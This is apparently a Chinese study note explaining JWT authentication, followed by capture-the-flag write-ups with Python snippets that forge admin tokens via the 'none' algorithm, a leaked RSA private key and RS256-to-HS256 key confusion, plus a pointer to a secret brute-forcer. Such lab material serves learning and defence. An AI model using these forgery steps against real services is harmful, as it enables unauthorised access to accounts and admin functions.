# JWT

## 浏览器认证

### 传统的session认证：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675066407869-05311fff-c456-4b29-a0dd-3b976d05674b.png#averageHue=%23f8f6f5&clientId=ue76f3134-5f5a-4&from=paste&id=u4fd57ac6&originHeight=513&originWidth=1033&originalType=url&ratio=1&rotation=0&showTitle=false&size=269374&status=done&style=none&taskId=uce583a1c-30b4-4e0d-a0d8-35643a54cde&title=)

- Http不知道用户是谁
- 如果用户向服务器提供了用户名和密码来进行用户认证，下次请求时，用户还要再一次进行用户认证才行。因为根据http协议，服务器并不能知道是哪个用户发出的请求
- 所以服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,
- 以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了

> 缺点是：
>
> - 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大

### 基于token的鉴权机制

- 用户使用用户名密码来请求服务器
- 服务器进行验证用户的信息
- 服务器通过验证发送给用户一个token
- 客户端存储token，并在每次请求时附送上这个token值
- 服务端验证token值，并返回数据
  :::info

- 同样是无状态的
- 不需要去考虑用户在哪一台服务器登录了
- token在每次请求时保存在请求头里
  :::

### JWT(JSON Web Token)

- JWT 由  header + payload + signature构成

**header**<br />jwt的头部承载两部分信息：

- 声明类型，这里是jwt
- 声明加密的算法 通常直接使用 HMAC SHA256

完整的头部就像下面这样的JSON：

```json
{   
  'typ': 'JWT',   
  'alg': 'HS256' 
} 
```

然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分.<br />eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 

- 这串密文就是对上面的内容进行base64的加密

**playload**

- 载荷就是存放有效信息的地方。这些有效信息包含三个部分
- 标准中注册的声明
- 公共的声明
- 私有的声明

**标准中注册的声明** (建议但不强制使用) ：

- **iss**: jwt签发者
- **sub**: jwt所面向的用户
- **aud**: 接收jwt的一方
- **exp**: jwt的过期时间，这个过期时间必须要大于签发时间
- **nbf**: 定义在什么时间之前，该jwt都是不可用的.
- **iat**: jwt的签发时间
- **jti**: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。

**公共的声明** 

- 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密.

**私有的声明** 

- 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。

定义一个payload:

```javascript
{   
  "sub": "1234567890",  
  "name": "John Doe",  
  "admin": true 
} 
```

然后将其进行base64加密，得到Jwt的第二部分。

**signature**<br />该部分由3部分构成

- header (base64后的)
- payload (base64后的)
- secret

就是把base64_encode(header)和base64_encode(payload)结合，再用header中声明的加密方式进行加盐`secret`组合加密

```javascript
// javascript
var encodedString = base64UrlEncode(header) + '.' + base64UrlEncode(payload);

var signature = HMACSHA256(encodedString, 'secret'); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

:::info

- secret是保存在服务器端的，jwt的签发生成也是在服务器端的
- **secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥**
- 在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。
  :::

#### 应用

- 一般是在请求头里加入Authorization，并加上Bearer标注：

```javascript
fetch('api/user/1', {   
  headers: {     
    'Authorization': 'Bearer ' + token   
  } 
})
```

服务端会验证token，如果验证通过就会返回相应的资源,整个流程如下：

#### ![](https://cdn.nlark.com/yuque/0/2023/webp/29405061/1675065699096-e64a30df-773b-4fa6-b3a5-98de97d568ce.webp#averageHue=%23ededed&clientId=ue76f3134-5f5a-4&from=paste&id=u25ad5eb2&originHeight=673&originWidth=1200&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u31049ef1-9c3d-43de-b26a-58db6a06181&title=)

#### ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675066539108-d396363b-ffdb-4ffa-bf45-4067b4290285.png#averageHue=%238ab989&clientId=ue76f3134-5f5a-4&from=paste&id=u46659412&originHeight=433&originWidth=834&originalType=url&ratio=1&rotation=0&showTitle=false&size=209739&status=done&style=none&taskId=uf5964efd-196e-4fa1-8ebf-ef1e903b252&title=)<br />总结

- 因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。
- 因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。
- 便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。
- 它**不需要在服务端保存会话信息, **所以它易于应用的扩展

## 例题

[https://jwt.io/](https://jwt.io/)  破解jwt的各个部分

### web345(签名算法改为None）

#### 知识点

要注意使用 url 访问网页时

- /admin	表示访问 admin.php 文件
- /admin/	表示访问 admin/目录下的文件，默认是 index.php

#### 解题过程

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675067616061-f97a195d-d994-492a-84f5-ef7ea21cc7a9.png#averageHue=%23fcfbfa&clientId=ue76f3134-5f5a-4&from=paste&height=51&id=u925354e8&originHeight=102&originWidth=335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5157&status=done&style=none&taskId=u30edf148-f506-4feb-a7ca-da8a24cc6eb&title=&width=167.5)

- 题目提示访问/admin
- 查看application，发现cookie的值是jwt形式，base64解密

```json
{"alg":"None","typ":"jwt"}[{"iss":"admin","iat":1675067674,"exp":1675074874,"nbf":1675067674,"sub":"user","jti":"e90194a5df6f73dd6a943eaece490577"}]
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675150997901-fe253f92-3b19-45ef-b659-f02a7f5ebb3d.png#averageHue=%23fdfdfd&clientId=ue6fec3f1-2d6d-4&from=paste&height=559&id=u65d6b5fa&originHeight=1118&originWidth=2348&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156327&status=done&style=none&taskId=uc85271ec-3df7-4a3d-9272-eb6730ee859&title=&width=1174)

- 这里是None发现没有加密，所以变成了 `header + payload + . `，也就是可以直接验证
- 将sub面向对象的user改为admin，我理解这里就是能访问admin的文件夹了
- 重新访问/admin/，Burp抓包拿到flag

### web346

:::info
JWT 支持将算法设定为 “None”。如果“alg” 字段设为“ None”，那么签名会被置空，这样任何 token 都是有效的。**用下面的代码试一下，确实signature是空的。**
:::

```python
import jwt

# payload
token_dict = {
  "iss": "admin",
  "iat": 1632670820,
  "exp": 1632678020,
  "nbf": 1632670820,
  "sub": "admin",
  "jti": "147cc3b129a041cdd38e3f127680d1e4"
}

headers = {
  "alg": "none",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  		# payload, 有效载体
                       "",  				# 进行加密签名的密钥
                       algorithm="none",  	 # 指明签名算法方式, 默认也是HS256
                       headers=headers 
                       # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       )

print(jwt_token)
```

### web 347(弱口令)

[GitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)

- 用这个工具爆破jwt的secret

### web349(RS256)

- 在jwt.io中解密

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675823672394-5bbc99a3-522c-4d85-b862-c7e1cb2d81ca.png#averageHue=%23fefdfd&clientId=u86d31080-b757-4&from=paste&height=341&id=ubdfed8ea&originHeight=682&originWidth=1873&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119375&status=done&style=none&taskId=u52065c2a-99b2-4808-97c7-92528b81784&title=&width=936.5)

- 发现是RS256，也就是signature是用rsa的私钥进行签名得到的
- 访问源码

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675823633809-b671364f-87f7-4022-ad87-b64e1eb8dde3.png#averageHue=%23fdfcfb&clientId=u86d31080-b757-4&from=paste&height=358&id=u547000a5&originHeight=716&originWidth=1246&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75769&status=done&style=none&taskId=u096c5e81-7aea-4973-9edf-77d9457c740&title=&width=623)
:::info

- 以为这里的目录会是/public/private.key，但实际上是/private.key
- **所以还是要多试试**
  :::

- 接着就是构造签名，直接用私钥生成即可，上脚本

```python
import jwt
public = open('private.key', 'r').read()
payload={"user":"admin"}
print(jwt.encode(payload, key=public, algorithm='RS256'))
# python2运行
```

### web 350(密钥混淆攻击)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1675825078342-71521ebe-3224-477c-9813-ae1ff639523e.png#averageHue=%231f1f1e&clientId=u86d31080-b757-4&from=paste&height=662&id=uf6acbb1e&originHeight=1324&originWidth=1667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=229751&status=done&style=none&taskId=u72b7eb0a-1c86-48e9-84c9-fd48d817af4&title=&width=833.5)

- 查看源码和上一个题一样
- 但是这里我**只能获取公钥，不能获取私钥**
  :::info

1.  把RS256改成HS256，这样就是对称的了
2.  用public.key对payload签名
3.  由于是对称的且server已知public.key，它会用public.key验证，攻击成功
    :::

#### 防御方法

- JWT配置应该只允许使用HMAC算法或公钥算法，决不能同时使用这两种算法